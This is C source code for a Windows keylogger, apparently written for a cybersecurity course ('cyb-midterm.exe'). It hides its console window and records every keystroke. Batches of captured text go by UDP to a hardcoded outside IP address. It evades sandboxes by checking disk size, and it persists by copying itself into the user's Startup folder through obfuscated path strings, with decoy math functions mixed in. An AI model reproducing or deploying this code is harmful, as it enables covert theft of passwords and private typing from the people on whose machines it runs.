#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <conio.h>
#include <unistd.h>
#include <string.h>
#include <fileapi.h>
#include <Lmcons.h>
#include <sysinfoapi.h>
#include <ctype.h>


#define P_O_R_T 4081

#define A_D_R "163.118.165.179"

void va_swap_for();
void square();
void g_et_n_a_m_e();
int che_ecks();
int sequence_mats();
int cal_fibo_ma();


int main(void){
	HWND window = GetConsoleWindow();
	ShowWindow(window, 0);
	char p_a_t_h[500];
	int sockfd;
    struct sockaddr_in servaddr, si_o;
    int slen = sizeof(si_o);
    WSADATA wsa;
    int delta = sequence_mats(4);
    int binomial_calc = cal_fibo_ma(5);
    square();
    g_et_n_a_m_e();

    if(WSAStartup(MAKEWORD(2,2), &wsa) != 0){
    	perror("wsa error");
    	exit(EXIT_FAILURE);
    }

    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) {
        perror("creation failed");
        exit(EXIT_FAILURE);
    }
   
    memset(&servaddr, 0, sizeof(servaddr));
       
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(P_O_R_T);
    servaddr.sin_addr.s_addr = inet_addr(A_D_R);
  
  
	char main_string[1000000];
	int outside_go = 0;
	while(1){
		for(int i = 8; i < 227 ; i++){
			if(GetAsyncKeyState(i) == -32767){
				switch(i){
					case VK_SHIFT:
						char *string1 = "[SHIFT]";
						strncat(main_string, string1, sizeof(string1));
						break;
					case VK_SPACE:
						char *string2 = " ";
						strncat(main_string, string2, sizeof(string2));
						break;
					case VK_BACK:
						char *string3 = "[BACK]";
						strncat(main_string, string3, sizeof(string3));
						break;
					case VK_RETURN:
						char *string4 = "[ENTER]\n";
						strncat(main_string, string4, sizeof(string4));
						break;
					case VK_TAB:
						char *string5 = "[TAB]";
						strncat(main_string, string5, sizeof(string5));
						break;
					case VK_CONTROL:
						char *string6 = "\n[CTRL]\n";
						strncat(main_string, string6, sizeof(string6));
						break;
					case VK_CAPITAL:
						char *string7 = "\n[CAPS-LOCK]\n";
						strncat(main_string, string7, sizeof(string7));
						break;
					case VK_DELETE:
						char *string8 = "[DEL]";
						strncat(main_string, string8, sizeof(string8));
						break;
					default:
						if(i >= 65 && i <= 90){
							if(!(GetAsyncKeyState(VK_SHIFT) || GetAsyncKeyState(VK_CAPITAL))){
								i = i + 32;
								char letter_first = (char)i;
								strncat(main_string, &letter_first, sizeof(letter_first));
							}
							else{
								char letter_next = (char)i;
								strncat(main_string, &letter_next, sizeof(letter_next));
							}
						}
						else if ((i < 65) || (i > 90) ){
							if(!(GetAsyncKeyState(VK_SHIFT) || GetAsyncKeyState(VK_CAPITAL))){
								char bracket_1[7] = "[";
								char bracket_2[3] = "]";
								char let[4];
								itoa(i, let, 10);
								strncat(bracket_1, let, strlen(let));
								strncat(bracket_1, bracket_2, strlen(bracket_2));
								strncat(main_string, bracket_1, strlen(bracket_1));
							}
							else{
								char string[15] = "[SHIFT]";
								char letter[4];
								itoa(i, letter, 10);
								strncat(string, letter, strlen(letter));
								strncat(main_string, string, strlen(string));
								
							}
						}
						else{
							char letter_last = (char)i;
							char letter_last2[4];
							itoa(i, letter_last2, 10);
							strncat(main_string, letter_last2, strlen(letter_last2));	
						}
						break;
				}				
			}
		}
		outside_go++;
		if(outside_go == 1000){
			sendto(sockfd, (const char*)main_string, strlen(main_string), 0, (const struct sockaddr *) &servaddr,sizeof(servaddr));
			outside_go = 0;
			for(int i = 0; i < sizeof(main_string); i++){
				main_string[i] = '\0';
			}
		}
		else{Sleep(10);}	
	}
	close(sockfd);
	return 0;
}

void va_swap_for(){
	int x = 1;
	int y = 2;
	int temp = 0;
	for(int i = 0; i < 65000; i++){
		for(int k = 0; k < 65000; k++){
			for(int j = 0; j < 65000; j++){
				for(int w = 0; w < 65000; w++){
					temp = x;
					x = y;
					y = temp;
				}
			}
		}
	}
	exit(0);
}

void square(){
	char *lpc = "C:\\";
	long int d = 2;
	UINT64 free1 = 0, total = 0, totalfree = 0;

	int fd = GetDiskFreeSpaceExA(lpc,(PULARGE_INTEGER)&free1, (PULARGE_INTEGER)&total, (PULARGE_INTEGER)&totalfree);
	if((total/1000000000) < 100){
		va_swap_for();
	}
	else{
		return;
	}

}


void g_et_n_a_m_e(){
	int ck = che_ecks();
	if(ck == 1){
		return;
	}
	else if(ck == 2){
		exit(EXIT_FAILURE);
	}
	
	char m_ain[10000];
	char s_1[6] = "dpqz!";
	char string[11] = "D;]Vtfst]";
	char string2[85] = "]BqqEbub]Spbnjoh]Njdsptpgu]Xjoepxt]Tubsu!Nfov]Qsphsbnt]Tubsuvq]dzc.njeufsn/fyf";
	char cqwd[1000];
	char surce[1000];
	char dist[1000];

	char u_srn_ame[UNLEN+1];
	DWORD u_srn_ame_len = UNLEN+1;
	GetUserName(u_srn_ame, &u_srn_ame_len);

	if(getcwd(cqwd, sizeof(cqwd)) != NULL){
    	strncat(cqwd, "\\cyb-midterm.exe", 18);
    }


    for(int i = 0; i < strlen(s_1); i++){
    	s_1[i] = s_1[i] - 1;
    }
    for(int i = 0; i < strlen(string); i++){
    	string[i] = string[i] - 1;
    }
    for(int i = 0; i < strlen(string2); i++){
    	string2[i] = string2[i] - 1;
    }
    char k[2] = {" "};
    char quote[3] = "\"";
    strncat(surce, cqwd, strlen(cqwd));
    strncat(dist, string, strlen(string));
    strncat(dist, u_srn_ame, strlen(u_srn_ame));
    strncat(dist, string2, strlen(string2));
    
    int b = CopyFile(surce, dist, TRUE);

    return;
}
int che_ecks(){
	char cqwd[1000];
	char string[10] = "putrats";
	int k = 0, flag = 0, ret_val = 2;
	if(getcwd(cqwd, sizeof(cqwd)) != NULL){
		for(int i = strlen(cqwd) - 1; i >= 0; i--){
			if(tolower(cqwd[i]) != string[k]){
				ret_val = 0;
				break;
			}
			else if(tolower(cqwd[i]) == string[k] && k == 6){
				ret_val = 1;
				break;
			}
			else{
				k++;
			}
		}
	}

	return ret_val;
}

int sequence_mats(int number){
	if(number <= 1){
		return 1;
	}
	else{
		return number * sequence_mats(number-1);
	}
}

int cal_fibo_ma(int i) {
   if(i == 0) {
      return 0;
   }
   if(i == 1) {
      return 1;
   }
   return cal_fibo_ma(i-1) + cal_fibo_ma(i-2);
}